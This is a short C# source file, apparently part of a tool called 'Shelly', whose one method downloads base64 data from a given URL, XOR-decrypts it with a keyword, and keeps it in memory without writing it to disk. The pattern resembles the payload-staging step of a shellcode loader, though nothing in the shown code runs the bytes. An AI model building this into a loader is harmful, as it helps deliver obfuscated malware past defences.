using cryptic;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Shelly
{
    public class InMemStorage
    {
        public async Task<byte[]> DecryptAndSave(string url, string keyword)
        {
            using (var client = new HttpClient())
            {
                var base64EncodedData = await client.GetStringAsync(url);
                var encodedData = Convert.FromBase64String(base64EncodedData);
                var inputData = encodedData;
                var xorDecrypted = XOR.XorEncDec(inputData, keyword);
                return xorDecrypted;
            }
        }
  }
}
